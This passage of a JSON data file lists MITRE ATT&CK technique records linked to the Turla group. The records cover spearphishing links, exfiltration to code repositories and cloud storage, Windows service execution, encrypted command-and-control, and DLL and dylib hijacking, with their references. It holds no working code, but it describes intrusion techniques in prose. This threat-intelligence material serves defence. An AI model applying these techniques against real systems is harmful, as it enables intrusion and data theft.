    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). \n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)",
    "technique_references": [
      {
        "source_name": "ACSC Email Spoofing",
        "url": "https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf",
        "description": "Australian Cyber Security Centre. (2012, December). Mitigating Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Trend Micro Pawn Storm OAuth 2017",
        "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks",
        "description": "Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication in Advanced Social Engineering Attacks. Retrieved October 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft OAuth 2.0 Consent Phishing 2021",
        "url": "https://www.microsoft.com/security/blog/2021/07/14/microsoft-delivers-comprehensive-solution-to-battle-rise-in-consent-phishing-emails/",
        "description": "Microsoft 365 Defender Threat Intelligence Team. (2021, June 14). Microsoft delivers comprehensive solution to battle rise in consent phishing emails. Retrieved December 13, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Anti Spoofing",
        "url": "https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide",
        "description": "Microsoft. (2020, October 13). Anti-spoofing protection in EOP. Retrieved October 19, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/163.html",
        "description": "none",
        "external_id": "CAPEC-163"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7",
    "platform": "linux|macos|windows",
    "tid": "T1567.001",
    "technique": "Exfiltration to Code Repository",
    "tactic": "exfiltration",
    "datasources": "command-execution|file-access|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ",
    "technique_references": [],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b",
    "platform": "linux|macos|windows",
    "tid": "T1567.002",
    "technique": "Exfiltration to Cloud Storage",
    "tactic": "exfiltration",
    "datasources": "command-execution|file-access|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",
    "technique_references": [],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
    "platform": "windows",
    "tid": "T1569.002",
    "technique": "Service Execution",
    "tactic": "execution",
    "datasources": "command-execution|process-creation|service-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "tinyturla",
    "correlation_tool": "empire|net|psexec",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",
    "technique_references": [
      {
        "source_name": "Microsoft Service Control Manager",
        "url": "https://docs.microsoft.com/windows/win32/services/service-control-manager",
        "description": "Microsoft. (2018, May 31). Service Control Manager. Retrieved March 28, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Russinovich Sysinternals",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx",
        "description": "Russinovich, M. (2014, May 2). Windows Sysinternals PsExec v2.11. Retrieved May 13, 2015.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
    "platform": "linux|windows|macos",
    "tid": "T1573.001",
    "technique": "Symmetric Cryptography",
    "tactic": "command-and-control",
    "datasources": "network-traffic-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|gazer|hyperstack|lightneuron|mosquito",
    "correlation_tool": "",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "technique_references": [
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada",
    "platform": "linux|macos|windows",
    "tid": "T1573.002",
    "technique": "Asymmetric Cryptography",
    "tactic": "command-and-control",
    "datasources": "network-traffic-content",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "carbon|comrat|gazer|penquin|tinyturla",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).",
    "technique_references": [
      {
        "source_name": "SANS Decrypting SSL",
        "url": "http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840",
        "description": "Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SEI SSL Inspection Risks",
        "url": "https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html",
        "description": "Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "defense-evasion",
    "datasources": "file-creation|file-modification|module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Hijacking July 2010",
        "url": "https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html",
        "description": "Harbour, N. (2010, July 15). Malware Persistence without the Windows Registry. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye fxsst June 2011",
        "url": "https://www.fireeye.com/blog/threat-research/2011/06/fxsst.html",
        "description": "Harbour, N. (2011, June 3). What the fxsst?. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "persistence",
    "datasources": "file-creation|file-modification|module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Hijacking July 2010",
        "url": "https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html",
        "description": "Harbour, N. (2010, July 15). Malware Persistence without the Windows Registry. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye fxsst June 2011",
        "url": "https://www.fireeye.com/blog/threat-research/2011/06/fxsst.html",
        "description": "Harbour, N. (2011, June 3). What the fxsst?. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
    "platform": "windows",
    "tid": "T1574.001",
    "technique": "DLL Search Order Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "file-creation|file-modification|module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      },
      {
        "source_name": "Microsoft Dynamic Link Library Search Order",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Search Order. Retrieved November 30, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Hijacking July 2010",
        "url": "https://www.fireeye.com/blog/threat-research/2010/07/malware-persistence-windows-registry.html",
        "description": "Harbour, N. (2010, July 15). Malware Persistence without the Windows Registry. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "OWASP Binary Planting",
        "url": "https://www.owasp.org/index.php/Binary_planting",
        "description": "OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye fxsst June 2011",
        "url": "https://www.fireeye.com/blog/threat-research/2011/06/fxsst.html",
        "description": "Harbour, N. (2011, June 3). What the fxsst?. Retrieved November 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Security Advisory 2269637",
        "url": "https://docs.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637",
        "description": "Microsoft. (, May 23). Microsoft Security Advisory 2269637. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Dynamic-Link Library Redirection",
        "url": "https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN",
        "description": "Microsoft. (2018, May 31). Dynamic-Link Library Redirection. Retrieved March 13, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Manifests",
        "url": "https://msdn.microsoft.com/en-US/library/aa375365",
        "description": "Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DLL Search Order Hijacking",
        "url": "https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html",
        "description": "Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "defense-evasion",
    "datasources": "file-creation|file-modification|module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
    "technique_references": [
      {
        "source_name": "MalwareUnicorn macOS Dylib Injection MachO",
        "url": "https://malwareunicorn.org/workshops/macos_dylib_injection.html#5",
        "description": "Amanda Rousseau. (2020, April 4). MacOS Dylib Injection Workshop. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Developer Doco Archive Run-Path",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html",
        "description": "Apple Inc.. (2012, July 7). Run-Path Dependent Libraries. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijacking OSX 2015",
        "url": "https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf",
        "description": "Patrick Wardle. (2015, March 1). Dylib Hijacking on OS X. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijack Vulnerable Apps",
        "url": "https://objective-see.com/blog/blog_0x46.html",
        "description": "Patrick Wardle. (2019, July 2). Getting Root with Benign AppStore Apps. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "wardle artofmalware volume1",
        "url": "https://taomm.org/vol1/pdfs.html",
        "description": "Patrick Wardle. (2020, August 5). The Art of Mac Malware Volume 0x1: Analysis. Retrieved March 19, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject HijackScanner",
        "url": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py",
        "description": "Wardle, P., Ross, C. (2017, September 21). Empire Project Dylib Hijack Vulnerability Scanner. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject CreateHijacker Dylib",
        "url": "https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py",
        "description": "Wardle, P., Ross, C. (2018, April 8). EmpireProject Create Dylib Hijacker. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/471.html",
        "description": "none",
        "external_id": "CAPEC-471"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "persistence",
    "datasources": "file-creation|file-modification|module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
    "technique_references": [
      {
        "source_name": "MalwareUnicorn macOS Dylib Injection MachO",
        "url": "https://malwareunicorn.org/workshops/macos_dylib_injection.html#5",
        "description": "Amanda Rousseau. (2020, April 4). MacOS Dylib Injection Workshop. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Developer Doco Archive Run-Path",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html",
        "description": "Apple Inc.. (2012, July 7). Run-Path Dependent Libraries. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijacking OSX 2015",
        "url": "https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf",
        "description": "Patrick Wardle. (2015, March 1). Dylib Hijacking on OS X. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijack Vulnerable Apps",
        "url": "https://objective-see.com/blog/blog_0x46.html",
        "description": "Patrick Wardle. (2019, July 2). Getting Root with Benign AppStore Apps. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "wardle artofmalware volume1",
        "url": "https://taomm.org/vol1/pdfs.html",
        "description": "Patrick Wardle. (2020, August 5). The Art of Mac Malware Volume 0x1: Analysis. Retrieved March 19, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject HijackScanner",
